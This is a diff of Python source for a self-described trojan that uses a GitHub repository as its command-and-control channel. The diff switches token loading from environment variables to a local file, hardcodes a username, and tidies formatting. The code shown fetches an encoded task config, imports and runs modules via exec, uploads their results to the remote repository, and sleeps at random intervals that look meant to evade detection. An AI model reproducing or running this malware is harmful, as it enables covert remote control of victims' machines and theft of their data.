@@ -7,18 +7,14 @@ import sys
 import threading
 import time
 from datetime import datetime
-import os
-from dotenv import load_dotenv
-
-load_dotenv()
 
 
 def github_connect():
     """Kết nối tới GitHub repository"""
-    user = os.getenv("USERNAME")  # Tên người dùng GitHub
-    # Đăng nhập vào GitHub
-    sess = github3.login(
-        token=os.getenv("GITHUB_TOKEN"))
+    with open('mytoken.txt') as f:
+        token = f.read()  # Đọc token xác thực từ file
+    user = 'lwd3c'  # Tên người dùng GitHub
+    sess = github3.login(token=token)  # Đăng nhập vào GitHub
     return sess.repository(user, 'bhptrojan')  # Trả về repository
 
 
@@ -35,21 +31,22 @@ class Trojan:
         self.data_path = f'data/{id}/'  # Đường dẫn lưu dữ liệu
         self.repo = github_connect()  # Kết nối tới repo
 
+
     def get_config(self):
         """Lấy và xử lý file cấu hình"""
         config_json = get_file_contents('config', self.config_file, self.repo)
-        config = json.loads(base64.b64decode(config_json)
-                            )  # Giải mã và parse JSON
+        config = json.loads(base64.b64decode(config_json))  # Giải mã và parse JSON
         for task in config:
             if task['module'] not in sys.modules:
-                # Import các module cần thiết
-                exec("import %s" % task['module'])
+                exec("import %s" % task['module'])  # Import các module cần thiết
         return config
+
 
     def module_runner(self, module):
         """Chạy module và lưu kết quả"""
         result = sys.modules[module].run()  # Chạy module
         self.store_module_result(result)  # Lưu kết quả
+
 
     def store_module_result(self, data):
         """Lưu kết quả lên GitHub"""
@@ -58,6 +55,7 @@ class Trojan:
         bindata = bytes('%r' % data, 'utf-8')  # Chuyển dữ liệu sang dạng bytes
         self.repo.create_file(remote_path, message, base64.b64encode(
             bindata))  # Tạo file mới trên GitHub
+
 
     def run(self):
         """Hàm chính để chạy trojan"""
@@ -69,8 +67,7 @@ class Trojan:
                     args=(task['module'],))  # Tạo thread mới cho mỗi task
                 thread.start()  # Chạy thread
                 time.sleep(random.randint(1, 10))  # Delay ngẫu nhiên 1-10s
-            # Delay ngẫu nhiên 30p-3h
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(30*60, 3*60*60))  # Delay ngẫu nhiên 30p-3h
 
 
 class GitImporter:
